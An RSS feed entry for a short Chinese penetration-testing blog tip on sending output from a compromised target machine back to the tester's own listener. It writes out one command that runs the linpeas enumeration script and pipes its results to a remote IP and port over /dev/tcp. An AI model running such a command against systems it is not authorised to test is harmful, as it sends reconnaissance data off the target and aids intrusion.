      <pubDate>Sun, 28 Jan 2024 17:54:19 &#43;0000</pubDate>
      <author>knock_s@foxmial.com (L)</author>
      <guid>https://test692618.github.io/post/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/%E5%B0%86%E9%9D%B6%E6%9C%BA%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E4%BC%A0%E5%9B%9E%E8%87%B3%E6%9C%AC%E6%9C%BA/</guid>
      <description>
        <![CDATA[<h1>将靶机执行结果传回至本机</h1><p>作者：L（knock_s@foxmial.com）</p>
        
          <p>1.现在本机做好端口监听</p>
<p><img src="./../../images/image-20240128205726924.png" alt="image-20240128205726924"></p>
<p>Tee 命令表示创建分支，将输出结果存到a.txt中</p>
<p>2.在目标机器执行程序</p>
<p><img src="./../../images/image-20240128205758726.png" alt="image-20240128205758726"></p>
<p>或</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111
</span></span></code></pre></div><p>如果输出的a.txt文件有可能存在乱起八糟的符号。</p>
        
        <hr><p>本文2024-01-28首发于<a href='https://test692618.github.io/'>HELLO WORLD</a>，最后修改于2024-01-28</p>]]>
